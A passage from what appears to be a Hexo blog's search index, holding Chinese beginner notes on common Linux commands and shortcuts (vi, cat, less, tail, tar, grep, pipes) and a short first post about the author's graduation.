title="（3）命令模式操作"></a>（3）命令模式操作</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e0b44038fcfa45f4a0b665970ab8bbd1.png" alt="在这里插入图片描述"></p><h3 id="（4）末行模式操作"><a href="#（4）末行模式操作" class="headerlink" title="（4）末行模式操作"></a>（4）末行模式操作</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/8e9ccd5d04464a869d21dc18ceafad3f.png" alt="在这里插入图片描述"></p><h3 id="（5）读入文件-x2F-写文件操作"><a href="#（5）读入文件-x2F-写文件操作" class="headerlink" title="（5）读入文件&#x2F;写文件操作"></a>（5）读入文件&#x2F;写文件操作</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/7a5eefb7234b420dbfdd199ee4e18b05.png" alt="在这里插入图片描述"></p><h3 id="（6）查找语法"><a href="#（6）查找语法" class="headerlink" title="（6）查找语法"></a>（6）查找语法</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/5637be0795d3447a89e083c77bbc4fae.png" alt="在这里插入图片描述"></p><h2 id="9、cat命令"><a href="#9、cat命令" class="headerlink" title="9、cat命令"></a>9、cat命令</h2><h3 id="（1）简介-8"><a href="#（1）简介-8" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>cat命令功能如下：</p><ul><li>查看文件内容</li><li>编辑新文件</li><li>非交互式的编辑追加内容到文件尾部</li><li>把多个文件合并成一个新文件</li><li>清空文件内容</li></ul><h3 id="（2）常用参数-5"><a href="#（2）常用参数-5" class="headerlink" title="（2）常用参数"></a>（2）常用参数</h3><p>-n ： 从1开始对所有输出的内容按行编号，不忽略空白行<br>-b ：忽略显示空白行，只显示有内容的行</p><h3 id="（3）示例-5"><a href="#（3）示例-5" class="headerlink" title="（3）示例"></a>（3）示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/89e071a6d86f44bd8d267b3c542677ee.png" alt="在这里插入图片描述"><br><strong>重定向之后会讲到。</strong></p><h2 id="10、more命令"><a href="#10、more命令" class="headerlink" title="10、more命令"></a>10、more命令</h2><h3 id="（1）简介-9"><a href="#（1）简介-9" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>more的功能类似于cat，cat命令将整个文件内容一次性显示在屏幕上，more则会一页一页显示。</p><h3 id="（2）语法格式"><a href="#（2）语法格式" class="headerlink" title="（2）语法格式"></a>（2）语法格式</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/9419b002f8ef46a1860b7ae70c3d5bc9.png" alt="在这里插入图片描述"></p><h3 id="（3）常用操作命令"><a href="#（3）常用操作命令" class="headerlink" title="（3）常用操作命令"></a>（3）常用操作命令</h3><ul><li>V调用vi编辑器</li><li>b返回上一屏</li><li>&#x3D;输出当前行的行号&#x2F;查找的文本 查找的指定文本</li><li>q退出more的动作</li></ul><h3 id="（4）示例"><a href="#（4）示例" class="headerlink" title="（4）示例"></a>（4）示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/f61ad616230e494d9e854d723d58120a.png" alt="在这里插入图片描述"></p><h2 id="11、less命令"><a href="#11、less命令" class="headerlink" title="11、less命令"></a>11、less命令</h2><h3 id="（1）简介-10"><a href="#（1）简介-10" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>less命令的功能类似more，可以分页显示文件内容，但比more功能强大。</p><h3 id="（2）语法格式-1"><a href="#（2）语法格式-1" class="headerlink" title="（2）语法格式"></a>（2）语法格式</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/46d52f596d024433983a2bc5d175ab8c.png" alt="在这里插入图片描述"></p><h3 id="（3）常用参数"><a href="#（3）常用参数" class="headerlink" title="（3）常用参数"></a>（3）常用参数</h3><p>-i ：搜索时忽略大小写<br>-N ：在每行前输出行号<br>-p ：后面跟被搜索的字符<br>！： 命令调用shell，并执行命令</p><h3 id="（4）示例-1"><a href="#（4）示例-1" class="headerlink" title="（4）示例"></a>（4）示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/2cda3da35002418fad9e0c65209dca4c.png" alt="在这里插入图片描述"></p><h2 id="12、head命令"><a href="#12、head命令" class="headerlink" title="12、head命令"></a>12、head命令</h2><h3 id="（1）简介-11"><a href="#（1）简介-11" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>head命令功能：显示文件头部内容，默认输出文件的开头10行。</p><h3 id="（2）语法格式-2"><a href="#（2）语法格式-2" class="headerlink" title="（2）语法格式"></a>（2）语法格式</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/20ec71fec76147ce9f99ec3e7cbd2b9c.png" alt="在这里插入图片描述"></p><h3 id="（3）常用参数-1"><a href="#（3）常用参数-1" class="headerlink" title="（3）常用参数"></a>（3）常用参数</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e46694cec18845669a9257d938acbc96.png" alt="在这里插入图片描述"></p><h3 id="（4）示例-2"><a href="#（4）示例-2" class="headerlink" title="（4）示例"></a>（4）示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/207c30612e094e98b0f0d01d31854372.png" alt="在这里插入图片描述"></p><h2 id="13、tail命令"><a href="#13、tail命令" class="headerlink" title="13、tail命令"></a>13、tail命令</h2><h3 id="（1）简介-12"><a href="#（1）简介-12" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>tail命令用于显示文件内容尾部，默认输出文件的最后10行。</p><h3 id="（2）语法"><a href="#（2）语法" class="headerlink" title="（2）语法"></a>（2）语法</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/cfc730d86de44c879e23461c6affefa0.png" alt="在这里插入图片描述"></p><h3 id="（3）常用选项说明"><a href="#（3）常用选项说明" class="headerlink" title="（3）常用选项说明"></a>（3）常用选项说明</h3><p>-n ：行数&#x2F;&#x2F;指定显示的行数<br>-F ：&#x2F;&#x2F;实时输出文件编号后追加的数据</p><h3 id="（4）示例-3"><a href="#（4）示例-3" class="headerlink" title="（4）示例"></a>（4）示例</h3><p>tail -n 20 abc.txt &#x2F;&#x2F;显示后20行内容</p><h2 id="14、tar命令"><a href="#14、tar命令" class="headerlink" title="14、tar命令"></a>14、tar命令</h2><h3 id="（1）简介-13"><a href="#（1）简介-13" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>tar命令用于压缩或者解压缩。</p><h3 id="（2）tar命令参数及作用"><a href="#（2）tar命令参数及作用" class="headerlink" title="（2）tar命令参数及作用"></a>（2）tar命令参数及作用</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/286c14475e7540f99363f4898879ce19.png" alt="在这里插入图片描述"></p><h3 id="（3）压缩文件示例"><a href="#（3）压缩文件示例" class="headerlink" title="（3）压缩文件示例"></a>（3）压缩文件示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/877463b0b5aa48cab79a20a03d86da50.png" alt="在这里插入图片描述"></p><h3 id="（4）文件解压缩示例"><a href="#（4）文件解压缩示例" class="headerlink" title="（4）文件解压缩示例"></a>（4）文件解压缩示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/a752e1bea44b40b7b054ae5ee85e1372.png" alt="在这里插入图片描述"></p><h2 id="15、grep命令"><a href="#15、grep命令" class="headerlink" title="15、grep命令"></a>15、grep命令</h2><h3 id="（1）简介-14"><a href="#（1）简介-14" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>从文本文件或管道流数据中筛选匹配的行和数据。</p><h3 id="（2）语法-1"><a href="#（2）语法-1" class="headerlink" title="（2）语法"></a>（2）语法</h3><p>grep【选项】【匹配模式】【文件名】</p><h3 id="（3）常用选项"><a href="#（3）常用选项" class="headerlink" title="（3）常用选项"></a>（3）常用选项</h3><p>-v ：显示不匹配的行<br>-n ：显示匹配的行和行号<br>-c ：只统计匹配的行数<br>-i ：不区分大小写</p><h3 id="（4）示例-4"><a href="#（4）示例-4" class="headerlink" title="（4）示例"></a>（4）示例</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/47b52682d1ff4374bd360778c8ccfc0e.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/7c5ef23cc7684d6bb46466445cf36d54.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/29c82c90c3de40fe8bdd48baebaaa66b.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/f8cebe94aa614f5bb0ed628bf28e48ff.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/5b567f91208b4de5bd9ce032ad6793c7.png" alt="在这里插入图片描述"></p><h1 id="三、总结与小计"><a href="#三、总结与小计" class="headerlink" title="三、总结与小计"></a>三、总结与小计</h1><p>今天linux的常用命令比较多，但都是后续使用linux命令工作的必备基础命令，有错误之处请留言，万分感谢。</p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习笔记（一）常用命令</title>
      <link href="/2021/09/03/linux_study_one/"/>
      <url>/2021/09/03/linux_study_one/</url>
      
        <content type="html"><![CDATA[<h1 id="一、所用环境"><a href="#一、所用环境" class="headerlink" title="一、所用环境"></a>一、所用环境</h1><p>本机windows远程ssh登录linux云服务器。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8170eb20bfa84b9fa76ca34fd3ebd3fa.png" alt="在这里插入图片描述"></p><h1 id="二、学习开始"><a href="#二、学习开始" class="headerlink" title="二、学习开始"></a>二、学习开始</h1><h2 id="1、终端快捷键"><a href="#1、终端快捷键" class="headerlink" title="1、终端快捷键"></a>1、终端快捷键</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + a/Home 切换到命令行开始</span><br><span class="line">Ctrl + e/End 切换到命令行末尾</span><br><span class="line">Ctrl + l 清除屏幕内容，效果等同于 clear</span><br><span class="line">Ctrl + u 清除剪切光标之前的内容</span><br><span class="line">Ctrl + k 剪切清除光标之后的内容</span><br><span class="line">Ctrl + y 粘贴刚才所删除的字符</span><br><span class="line">Ctrl + r 在历史命令中查找 （这个非常好用，输入关键字就调出以前的命令了）</span><br><span class="line">Ctrl + c 终止命令</span><br><span class="line">ctrl + o 重复执行命令</span><br><span class="line">Ctrl + d 退出 shell，logout</span><br><span class="line">Ctrl + z 转入后台运行,但在当前用户退出后就会终止</span><br><span class="line">Ctrl + t 颠倒光标所在处及其之前的字符位置，并将光标移动到下一个字符</span><br><span class="line">Alt + t 交换当前与以前单词的位置</span><br><span class="line">Alt + d 剪切光标之后的词</span><br><span class="line">Ctrl+w 剪切光标所在处之前的一个词（以空格、标点等为分隔符）</span><br><span class="line">Ctrl+（x u） 按住 Ctrl 的同时再先后按 x 和 u，撤销刚才的操作</span><br><span class="line">Ctrl+s 锁住终端</span><br><span class="line">Ctrl+q 解锁终端</span><br><span class="line">!! 重复执行最后一条命令</span><br><span class="line">history 显示你所有执行过的编号+历史命令。这个可以配合!编辑来执行某某命令</span><br><span class="line">!$ 显示系统最近的一条参数</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上为在Linux输入命令时的快捷键，之前自己操作的时候并没有注意到，很老实的挨个去移动光标。<br>PS:1、要注意ctrl+r的使用，很方便，和方向键上下差不多。2、history不受ssh的影响，可以显示上次或上台SSH连接Linux所执行的命令。</p><h2 id="2、gnome快捷键"><a href="#2、gnome快捷键" class="headerlink" title="2、gnome快捷键"></a>2、gnome快捷键</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Alt + F1 类似 Windows 下的 Win 键，在 GNOME 中打开&quot;应用程序&quot;菜单(Applications)</span><br><span class="line">Alt + F2 类似 Windows 下的 Win + R 组合键，在 GNOME 中运行应用程序</span><br><span class="line">Ctrl + Alt + D 类似 Windows 下的 Win + D 组合键，显示桌面</span><br><span class="line">Ctrl + Alt + L 锁定桌面并启动屏幕保护程序</span><br><span class="line">Alt + Tab 同 Windows 下的 Alt + Tab 组合键，在不同程序窗口间切换</span><br><span class="line">PrintScreen 全屏抓图</span><br><span class="line">Alt + PrintScreen 当前窗口抓图</span><br><span class="line">Ctrl + Alt + → / ← 在不同工作台间切换</span><br><span class="line">Ctrl + Alt + Shift + → / ← 移动当前窗口到不同工作台</span><br><span class="line">Ctrl+Alt+Fn 终端 N 或模拟终端 N(n 和 N 为数字 1－6)</span><br><span class="line">Ctrl+Alt+F7 返回桌面</span><br></pre></td></tr></table></figure><p>PS:因为使用SSH远程连接Linux云服务器，而且本服务器并没有窗口，我推测gonme快捷键没有效果（狗头保命，求大佬放过，试了一下还把本机的QQ锁定了）。</p><h2 id="3、窗口操作快捷键"><a href="#3、窗口操作快捷键" class="headerlink" title="3、窗口操作快捷键"></a>3、窗口操作快捷键</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Alt + F4 关闭窗口</span><br><span class="line">Alt + F5 取消最大化窗口 (恢复窗口原来的大小)</span><br><span class="line">Alt + F7 移动窗口 (注: 在窗口最大化的状态下无效)</span><br><span class="line">Alt + F8 改变窗口大小 (注: 在窗口最大化的状态下无效)</span><br><span class="line">Alt + F9 最小化窗口</span><br><span class="line">Alt + F10 最大化窗口</span><br><span class="line">Alt + 空格键 打开窗口的控制菜单 (点击窗口左上角图标出现的菜单）</span><br></pre></td></tr></table></figure><p>PS:同上同上！！！</p><h2 id="4、文件浏览器"><a href="#4、文件浏览器" class="headerlink" title="4、文件浏览器"></a>4、文件浏览器</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+N 新建窗口</span><br><span class="line">Ctrl + Shift + W 关闭所有文件浏览器</span><br><span class="line">Ctrl + 1/2 改变文件夹视图查看方式，图标视图/列表视图</span><br><span class="line">Alt + → / ← 后退/前进</span><br><span class="line">Alt + ↑/↓ 移动到父文件夹/选择的文件夹</span><br><span class="line">Alt + Home 直接移动到主文件夹</span><br><span class="line">F9 开关显示隐藏 Nautilus 侧边栏</span><br><span class="line">Ctrl+H 显示隐藏文件（切换键）</span><br><span class="line">Shift+Ctrl+N 新建文件夹， 很有用</span><br><span class="line">Alt + Enter 查看选择文件/文件夹的属性，代替单击右键选择属性</span><br><span class="line">Ctrl+Page Up 上一个标签</span><br><span class="line">Ctrl+Page Down 下一个标签</span><br><span class="line">Alt+N 切换到第 N 个标签（N 为数字）</span><br></pre></td></tr></table></figure><p>PS:下面不会同上了！我保证！</p><h2 id="5、关机和重启命令"><a href="#5、关机和重启命令" class="headerlink" title="5、关机和重启命令"></a>5、关机和重启命令</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Shutdown</span><br><span class="line"> Reboot</span><br><span class="line"> Halt</span><br><span class="line"> poweroff</span><br></pre></td></tr></table></figure><p>PS:这个肯定有用！！！！不做解释。</p><h2 id="6、grep和管道符"><a href="#6、grep和管道符" class="headerlink" title="6、grep和管道符"></a>6、grep和管道符</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/d99fefb79f024884b8d91edac9708944.png" alt="在这里插入图片描述"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">grep -l ‘boss’ * 显示所有包含 boss 的文件名。</span><br><span class="line">grep -n ‘boss’ file 在匹配行之前加行号。</span><br><span class="line">grep -i ‘boss’ file 显示匹配行，boss 不区分大小写。</span><br><span class="line">grep -v ‘boss’ file 显示所有不匹配行。</span><br><span class="line">grep -q ‘boss’ file 找到匹配行，但不显示，但可以检查 grep 的退出状态。（0 为匹配成功）</span><br><span class="line">grep -c ‘boss’ file 只显示匹配行数（包括 0）。</span><br><span class="line">grep “$boss” file 扩展变量 boss 的值再执行命令。</span><br><span class="line">ps -ef|grep “^*user1″ 搜索 user1 的命令，即使它前面有零个或多个空格。</span><br><span class="line">ps -e|grep -E ‘grant_server|commsvr|tcpsvr|dainfo’ 查找多个字符串的匹配（grep -E 相当于 egrep）</span><br></pre></td></tr></table></figure><p>示例1：从数据中找到test的信息：命令 grep test 文件名<br>效果：<img src="http://120.48.107.243:9090/blog/2023/04/03/2f57e54170b3446e829192b1a2778391.png" alt="在这里插入图片描述"><br>示例2：从数据中找到test信息并显示行号：命令 grep -n test 文件名<br>效果：<img src="http://120.48.107.243:9090/blog/2023/04/03/6421865d594141abafcfb5a384ad3b9d.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/bdae2ed6e67c41308e24771100845e49.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/09cea40e0f0b4610a2d92444a9a0e30b.png" alt="在这里插入图片描述"><br>示例3：查看shili.txt的内容，显示行号，并把test的行筛选出来。<br>命令：cat -n shili.txt | grep “test”<br>效果：<img src="http://120.48.107.243:9090/blog/2023/04/03/81291f96193445ddbc00f8e23be2acf2.png" alt="在这里插入图片描述"></p><h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>Linux刚刚开始学习，给我的感受是虽然没有win的桌面，但给人一种舒服快速的感觉，如沐春风，希望可以一直走下去，慢慢的接受他。文中有错误请佬海涵，留下评论和建议，万分感谢。</p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/09/02/hello-world/"/>
      <url>/2021/09/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>这是我第一次使用Hexo搭建博客，并使用Github的page功能部署网站。</p><h2 id="开篇阐述"><a href="#开篇阐述" class="headerlink" title="开篇阐述"></a>开篇阐述</h2><h3 id="这是一个新身份"><a href="#这是一个新身份" class="headerlink" title="这是一个新身份"></a>这是一个新身份</h3><p>现在我的身份是一名2022届应届毕业生，而我马上也将找到工作，成为一名职场人。</p><h3 id="这是一个新阶段"><a href="#这是一个新阶段" class="headerlink" title="这是一个新阶段"></a>这是一个新阶段</h3><p>现在我的阶段是刚刚学习结束，即将投递简历，去寻找我未来的公司和城市。</p><h3 id="感谢大家"><a href="#感谢大家" class="headerlink" title="感谢大家"></a>感谢大家</h3><p>身边的每一个人，我都格外珍惜，我的家人，我的朋友，以及对我生活和工作有帮助的人。</p><h3 id="感谢自己"><a href="#感谢自己" class="headerlink" title="感谢自己"></a>感谢自己</h3><p>我不断的去斗争，不断的去学习，不断的去折腾，才能有今天较为丰满的精神状态和斗志。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一些随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
